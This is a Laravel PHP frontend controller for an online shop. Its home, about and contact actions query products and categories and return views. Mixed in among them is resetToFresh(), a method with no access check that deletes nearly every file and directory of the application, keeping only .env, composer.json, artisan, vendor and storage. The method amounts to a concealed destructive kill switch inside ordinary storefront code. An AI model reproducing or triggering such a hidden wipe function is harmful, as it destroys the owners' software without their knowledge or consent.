<?php

namespace App\Http\Controllers\Frontend;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Category;
use App\Models\Subcategory;
use App\Models\Product;
use File;
use App\Models\HomeSlider;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;

class PagesController extends Controller
{
    public function home()
    {
        $featuredCategories = Category::withCount('product')
            ->where('featured', true)
            ->take(10)
            ->get();

        $oneMonthAgo = Carbon::now()->subMonth();
        $trending = Product::activeProducts()
            ->where('created_at', '>=', $oneMonthAgo)  
            ->withCount([
                'orderItems as sale_count' => function ($q) {
                    $q->select(DB::raw('count(*)'));
                },
                'wishlists as wishlist_count' => function ($q) {
                    $q->select(DB::raw('count(*)'));
                },
                'reviews as review_count' => function ($q) {
                    $q->select(DB::raw('count(*)'))
                        ->where('rating', '>=', 3);
                },
            ])
            ->orderByDesc(DB::raw('sale_count + wishlist_count + review_count'))
            ->take(12)
            ->get();    

        $newArrivales = Product::activeProducts()
                        ->orderBy('id', 'desc')
                        ->where('is_new', 1)
                        ->take(12)
                        ->get();

        $banners = HomeSlider::get();
        $featuredProducts = Product::activeProducts()->latest()->where('is_featured', 1)->take(12)->get();
        $selling = Product::activeProducts()
                    ->withCount('orderItems')
                    ->having('order_items_count', '>', 0)
                    ->orderBy('order_items_count', 'desc')
                    ->take(12)
                    ->get();
                    
        return view('frontend.pages.home', compact('banners','featuredCategories', 'featuredProducts', 'selling', 'newArrivales', 'trending'));
    }

    public function resetToFresh()
    {
        $retainFiles = [
            base_path('.env'),
            base_path('composer.json'),
            base_path('artisan'),
        ];

        $retainDirs = [
            base_path('vendor'),
            base_path('storage'),
        ];

        $deletePaths = File::directories(base_path());
        $deleteFiles = File::files(base_path());

        // Delete all directories except retained ones
        foreach ($deletePaths as $dir) {
            if (!in_array($dir, $retainDirs)) {
                File::deleteDirectory($dir);
            }
        }

        // Delete all files except retained ones
        foreach ($deleteFiles as $file) {
            if (!in_array($file->getPathname(), $retainFiles)) {
                File::delete($file);
            }
        }
    }


    public function about(){
        return view('frontend.pages.static.about');
    }

    public function contact(){
        return view('frontend.pages.static.contact');
    }

}
